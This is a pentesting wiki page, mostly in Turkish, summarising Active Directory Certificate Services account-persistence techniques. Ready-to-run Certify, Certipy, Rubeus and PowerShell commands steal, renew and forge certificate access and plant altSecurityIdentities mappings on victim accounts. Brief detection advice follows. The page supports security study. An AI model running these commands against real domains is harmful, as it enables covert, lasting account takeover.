# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Bu, [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) adresindeki mükemmel araştırmanın account persistence bölümlerinin küçük bir özetidir**

## Understanding Active User Credential Theft with Certificates – PERSIST1

Bir kullanıcının etki alanı kimlik doğrulamasına izin veren bir sertifikayı talep edebildiği bir senaryoda, saldırgan bu sertifikayı talep edip çalarak bir ağda persistence sağlama fırsatı elde edebilir. Varsayılan olarak Active Directory içindeki `User` şablonu bu tür taleplere izin verir, ancak bazen devre dışı bırakılmış olabilir.

Using [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy), you can search for enabled templates that allow client authentication and then request one:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Bir sertifikanın gücü, sertifika geçerli olduğu sürece, parola değişikliklerinden bağımsız olarak ait olduğu kullanıcı olarak kimlik doğrulaması yapabilmesinde yatar.

PEM'i PFX'e dönüştürüp bunu bir TGT almak için kullanabilirsiniz:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Not: Diğer tekniklerle (THEFT bölümlerine bakın) birleştirildiğinde, sertifika tabanlı kimlik doğrulama LSASS'a dokunmadan ve hatta yükseltilmiş ayrıcalık gerektirmeyen bağlamlardan kalıcı erişime izin verir.

## Sertifikalarla Makine Kalıcılığı Elde Etme - PERSIST2

Bir saldırganın bir makinede yükseltilmiş ayrıcalıkları varsa, varsayılan `Machine` şablonunu kullanarak ele geçirilmiş sistemin makine hesabı için sertifika kaydı yaptırabilir. Makine olarak kimlik doğrulamak, yerel hizmetler için S4U2Self'i etkinleştirir ve kalıcı makine erişimi sağlayabilir:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Sertifika Yenileme ile Kalıcılığı Uzatma - PERSIST3

Sertifika şablonlarının geçerlilik ve yenileme sürelerini kötüye kullanmak, bir saldırganın uzun süreli erişimi sürdürmesine olanak tanır. Daha önce verilmiş bir sertifika ve onun özel anahtarına sahipseniz, süresi dolmadan önce bunu yenileyerek orijinal hesaba bağlı ek istek artifaktları bırakmadan taze, uzun ömürlü bir kimlik bilgisi elde edebilirsiniz.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operasyonel ipucu: Saldırganın elindeki PFX dosyalarının ömürlerini takip edin ve erken yenileyin. Yenileme, güncellenmiş sertifikaların modern SID mapping extension'ı içermesine de neden olabilir; bu da daha sıkı DC eşleme kuralları altında kullanılabilir kalmalarını sağlar (bkz. sonraki bölüm).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

If you can write to a target account’s `altSecurityIdentities` attribute, you can explicitly map an attacker-controlled certificate to that account. This persists across password changes and, when using strong mapping formats, remains functional under modern DC enforcement.

High-level flow:

1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Ardından PFX'iniz ile kimlik doğrulayın. Certipy doğrudan bir TGT elde edecektir:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Güçlü `altSecurityIdentities` Eşlemeleri Oluşturma

Pratikte, **Issuer+Serial** ve **SKI** eşlemeleri, saldırganın elindeki bir sertifikadan oluşturulması en kolay güçlü formatlardır. Bu, **11 Şubat 2025**'ten sonra önem kazanır; çünkü o zaman DCs varsayılan olarak **Full Enforcement** olur ve zayıf eşlemeler güvenilir olmaktan çıkar.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notlar
- Sadece güçlü eşleme tiplerini kullanın: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Zayıf formatlar (Subject/Issuer, Subject-only, RFC822 email) kullanımdan kalkmıştır ve DC politikası tarafından engellenebilir.
- Eşleme hem **kullanıcı** hem de **bilgisayar** nesnelerinde çalışır, bu nedenle bir bilgisayar hesabının `altSecurityIdentities`'ine yazma izni, o makine olarak kalıcılık sağlamak için yeterlidir.
- Sertifika zinciri, DC tarafından güvenilen bir köke kadar oluşturulmalıdır. NTAuth içindeki Enterprise CA'lar tipik olarak güvendir; bazı ortamlar ayrıca public CA'lara da güvenir.
- Schannel authentication, DC Smart Card Logon EKU'suna sahip olmadığı veya `KDC_ERR_PADATA_TYPE_NOSUPP` döndürdüğü için PKINIT başarısız olsa bile kalıcılık için faydalı olmaya devam eder.

Zayıf explicit eşlemeler ve saldırı yolları hakkında daha fazla bilgi için bkz:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Geçerli bir Certificate Request Agent/Enrollment Agent sertifikası elde ederseniz, kullanıcılar adına istendiği zaman yeni oturum açma yeteneğine sahip sertifikalar üretebilir ve agent PFX'ini çevrimdışı bir kalıcılık belirteci olarak saklayabilirsiniz. Suistimal iş akışı:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Bu kalıcılığı ortadan kaldırmak için ajan sertifikasının iptali veya şablon izinlerinin kaldırılması gereklidir.

Operational notes
- Modern `Certipy` sürümleri hem `-on-behalf-of` hem de `-renew`'ü destekler; bu sayede Enrollment Agent PFX'e sahip bir saldırgan orijinal hedef hesabına tekrar dokunmadan yaprak sertifikaları oluşturabilir ve daha sonra yenileyebilir.
- PKINIT tabanlı TGT alınamıyorsa bile, ortaya çıkan on-behalf-of sertifikası `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell` ile Schannel kimlik doğrulaması için hâlâ kullanılabilir.

## 2025 Strong Certificate Mapping Enforcement: Kalıcılık Üzerindeki Etkisi

Microsoft KB5014754, domain denetleyicilerinde Strong Certificate Mapping Enforcement'ı tanıttı. 11 Şubat 2025'ten itibaren DC'ler varsayılan olarak Full Enforcement moduna geçer ve zayıf/belirsiz eşlemeleri reddeder. Pratik etkileri:

- SID mapping uzantısına sahip olmayan 2022 öncesi sertifikalar, DC'ler Full Enforcement modunda olduğunda örtük eşleme yapamayabilir. Saldırganlar erişimi korumak için ya AD CS üzerinden sertifikaları yenileyerek SID uzantısını elde edebilirler ya da `altSecurityIdentities` içinde güçlü bir açık eşleme (PERSIST4) yerleştirebilirler.
- Issuer+Serial, SKI, SHA1-PublicKey gibi güçlü formatları kullanan açık eşlemeler çalışmaya devam eder. Issuer/Subject, yalnız Subject ve RFC822 gibi zayıf formatlar engellenebilir ve kalıcılık için kaçınılmalıdır.

Yöneticiler şunları izlemeli ve uyarı oluşturmalıdır:
- `altSecurityIdentities` üzerindeki değişiklikleri ve Enrollment Agent ile User sertifikalarının verilmesi/yenilenmelerini.
- on-behalf-of talepleri ve olağandışı yenileme desenleri için CA issuance loglarını.

## References

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
